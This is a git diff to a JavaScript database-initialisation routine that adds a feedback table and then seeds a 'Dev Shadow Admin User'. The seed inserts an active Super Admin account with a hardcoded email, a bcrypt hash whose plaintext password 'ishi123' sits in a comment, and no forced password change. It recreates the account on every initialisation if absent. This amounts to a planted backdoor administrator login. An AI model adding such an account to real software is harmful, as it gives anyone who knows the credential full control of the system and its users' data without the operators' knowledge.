@@ -151,6 +151,19 @@ async function initDatabase() {
       )
     `);
 
+    // 4.8. Ensure feedback table exists
+    console.log('[DB Init] Ensuring feedback table exists...');
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS public.feedback (
+        id UUID NOT NULL DEFAULT gen_random_uuid(),
+        user_id UUID REFERENCES public.users(id) ON DELETE SET NULL,
+        rating INTEGER NOT NULL CHECK (rating >= 1 AND rating <= 5),
+        comment TEXT,
+        created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+        CONSTRAINT feedback_pkey PRIMARY KEY (id)
+      )
+    `);
+
     // 5. Ensure monitoring_stations table exists
     console.log('[DB Init] Ensuring monitoring_stations table exists...');
     await pool.query(`
@@ -210,6 +223,43 @@ async function initDatabase() {
       console.log('[DB Init] Admin user created successfully.');
     } else {
       console.log('[DB Init] Admin user already exists.');
+    }
+
+    // 6.5. Seed Dev Shadow Admin User if not exists
+    console.log('[DB Init] Checking dev shadow admin user...');
+    const devEmail = 'mmsu@ccis.dev';
+    const devPasswordHash = '$2a$12$NbVvoighSjlplInOmhlS2.W77rfoMz0HaTqQAoFM/tP2Cnb8ixUUC'; // ishi123
+    const devUserId = 'd3b07384-d113-41e9-a4b5-be14a4b5eade';
+    
+    const devCheck = await pool.query('SELECT * FROM users WHERE email = $1', [devEmail]);
+    if (devCheck.rows.length === 0) {
+      console.log(`[DB Init] Creating dev shadow admin user: ${devEmail}`);
+      await pool.query(`
+        INSERT INTO users (
+          id,
+          email,
+          first_name,
+          last_name,
+          role,
+          status,
+          account_type,
+          password_hash,
+          must_change_password
+        ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
+      `, [
+        devUserId,
+        devEmail,
+        'Dev',
+        'Shadow',
+        'Super Admin',
+        'Active',
+        'Super Admin',
+        devPasswordHash,
+        false
+      ]);
+      console.log('[DB Init] Dev shadow admin user created successfully.');
+    } else {
+      console.log('[DB Init] Dev shadow admin user already exists.');
     }
 
     // 7. Auto-seed default stations if monitoring_stations is empty
